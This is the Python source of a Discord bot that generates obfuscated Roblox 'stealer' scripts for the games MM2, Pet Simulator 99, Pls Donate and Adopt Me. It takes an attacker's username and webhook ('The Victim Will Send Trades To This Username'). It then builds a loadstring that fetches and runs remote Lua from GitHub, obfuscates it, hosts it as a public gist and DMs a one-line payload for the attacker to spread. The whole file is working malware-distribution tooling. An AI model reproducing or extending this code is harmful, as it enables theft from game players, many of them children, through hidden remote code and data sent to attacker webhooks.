import os
import requests
import discord
from discord import app_commands
from discord.ext import commands
from datetime import datetime

# Initialize intents
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

# Create bot instance
bot = commands.Bot(command_prefix='/', intents=intents)

# Replace these with your tokens
BOT_TOKEN = os.getenv('BOT_TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
ERROR_LOG_WEBHOOK = os.getenv('ERROR_LOG_WEBHOOK')  # Error logging webhook
USER_ACTIVITY_WEBHOOK = os.getenv('USER_ACTIVITY_WEBHOOK')  # User activity webhook

# Helper function to create a GitHub Gist and return the clean Gist raw URL
def create_github_gist(file_content, filename, description="Generated Script"):
    url = "https://api.github.com/gists"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "description": description,
        "public": True,
        "files": {
            filename: {
                "content": file_content
            }
        }
    }
    response = requests.post(url, json=data, headers=headers)
    
    if response.status_code == 201:
        gist_url = response.json()["html_url"]
        gist_id = gist_url.split('/')[-1]
        raw_url = f"https://gist.githubusercontent.com/raw/{gist_id}"
        return raw_url
    else:
        raise Exception(f"Error creating GitHub Gist: {response.status_code}, {response.text}")

def send_error_log(error_message):
    """Send error logs to a Discord webhook."""
    data = {
        "content": f"**Error Log:**\n```{error_message}```",
        "username": "Bot Error Logger"
    }
    requests.post(ERROR_LOG_WEBHOOK, json=data)

def log_user_activity(username, stealer_type):
    """Log user activity with their Discord username and the type of stealer they generated."""
    data = {
        "content": f"**User Activity Log:**\n- **Username:** {username}\n- **Generated Stealer:** {stealer_type}",
        "username": "User Activity Logger"
    }
    requests.post(USER_ACTIVITY_WEBHOOK, json=data)

class CopyButton(discord.ui.Button):
    def __init__(self, loadstring_code):
        super().__init__(label="Copy", style=discord.ButtonStyle.primary)
        self.loadstring_code = loadstring_code

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_message(self.loadstring_code, ephemeral=True)

class CopyButtonView(discord.ui.View):
    def __init__(self, loadstring_code):
        super().__init__(timeout=None)
        self.add_item(CopyButton(loadstring_code))

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands globally.")
    except Exception as e:
        send_error_log(f"Error syncing commands: {e}")

@bot.tree.command(name="generate", description="Choose Your Stealer.")
async def generate(interaction: discord.Interaction):
    embed = discord.Embed(
        title="**CHOOSE YOUR STEALER**",
        description="🔪 **Mm2** = ✅\n🐱 **Ps99** = ✅\n🔪 **Pls Donate** = ✅\n🧸 **Adopt Me**",
        color=discord.Color.red()
    )
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    embed.set_footer(text=f"⚡ Pethical ⚡ | {current_time}")

    select = discord.ui.Select(
        placeholder="Click To Choose Your Stealer!",
        options=[
            discord.SelectOption(label="Mm2", value="mm2"),
            discord.SelectOption(label="Ps99", value="ps99"),
            discord.SelectOption(label="Pls Donate", value="plsdonate"),
            discord.SelectOption(label="Adopt Me", value="adoptme"),
        ]
    )

    async def select_callback(interaction: discord.Interaction):
        stealer_options = {
            "mm2": show_mm2_form,
            "ps99": show_ps99_form,
            "plsdonate": show_plsdonate_form,
            "adoptme": show_adoptme_form
        }
        await stealer_options[select.values[0]](interaction)

    select.callback = select_callback

    view = discord.ui.View()
    view.add_item(select)
    
    await interaction.response.send_message(embed=embed, view=view)

async def show_ps99_form(interaction):
    class Ps99Modal(discord.ui.Modal, title="Ps99 Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="Username Of The Account You Want Mail To Be Sent To")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")
       
        async def on_submit(self, interaction: discord.Interaction):
            username, webhook = self.username.value, self.webhook.value
            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/PS99/refs/heads/main/Protected_PS99.lua"))()"""
            log_user_activity(interaction.user.name, "PS99")
            await generate_and_send_script(interaction, script, "PS99")

    await interaction.response.send_modal(Ps99Modal())

async def show_plsdonate_form(interaction):
    class PlsDonateModal(discord.ui.Modal, title="Pls Donate Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")

        async def on_submit(self, interaction: discord.Interaction):
            username, webhook = self.username.value, self.webhook.value
            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/Pls-Donate/refs/heads/main/Protected_PlsDonate.lua'))()"""
            log_user_activity(interaction.user.name, "Pls Donate")
            await generate_and_send_script(interaction, script, "Pls Donate")

    await interaction.response.send_modal(PlsDonateModal())

async def show_mm2_form(interaction):
    class Mm2Modal(discord.ui.Modal, title="MM2 Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")

        async def on_submit(self, interaction: discord.Interaction):
            username, webhook = self.username.value, self.webhook.value
            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/MM2/refs/heads/main/Protected_MM2.lua'))()"""
            log_user_activity(interaction.user.name, "MM2")
            await generate_and_send_script(interaction, script, "MM2")

    await interaction.response.send_modal(Mm2Modal())

async def show_adoptme_form(interaction):
    class AdoptMeModal(discord.ui.Modal, title="Adopt Me Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="The Victim Will Send Trades To This Username")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Enter Your Webhook URL")

        async def on_submit(self, interaction: discord.Interaction):
            username, webhook = self.username.value, self.webhook.value
            script = f"""Username = "{username}"\nWebhook = "{webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua'))()"""
            log_user_activity(interaction.user.name, "Adopt Me")
            await generate_and_send_script(interaction, script, "Adopt Me")

    await interaction.response.send_modal(AdoptMeModal())

async def generate_and_send_script(interaction, script_content, script_name):
    obfuscations_dir = "obfuscations"
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os.makedirs(obfuscations_dir, exist_ok=True)
    
    script_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.lua")
    obfuscated_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.obfuscated.lua")

    try:
        with open(script_file_path, "w") as f:
            f.write(script_content)

        os.system(f"lua bot/Prometheus/cli.lua {script_file_path} --LuaU --preset Medium")

        with open(obfuscated_file_path, "r") as obfed_script_file:
            obf_script = obfed_script_file.read()

        raw_url = create_github_gist(obf_script, f"{interaction.user.id}_{script_name.lower()}.lua")
        loadstring_code_for_embed = f"```lua\nloadstring(game:HttpGet('{raw_url}'))()\n```"
        loadstring_code_for_copy = f"loadstring(game:HttpGet('{raw_url}'))()"

        await interaction.response.send_message(f"Check Your DMs, {interaction.user.mention}!", ephemeral=True)
        user_dm = await interaction.user.create_dm()

        embed = discord.Embed(
            title=f"**{script_name} Generated!**",
            description="Your script has been obfuscated for you.",
            color=discord.Color.blue()
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1299029863427997777/1375088904926920774/ezgif-773b12b7adb575.gif?ex=68306ad6&is=682f1956&hm=f1595a76726a16f9918645081365457571b473daa59c9b33f332609df3f2e747&")
        embed.add_field(name="Loadstring Code", value=loadstring_code_for_embed)
        embed.set_footer(text=f"⚡ Pethical ⚡ | {current_time}")

        view = CopyButtonView(loadstring_code_for_copy)
        await user_dm.send(embed=embed, view=view)

    except Exception as e:
        send_error_log(f"An error occurred: {e}")

    finally:
        for file_path in [script_file_path, obfuscated_file_path]:
            if os.path.exists(file_path):
                os.remove(file_path)

bot.run(BOT_TOKEN)
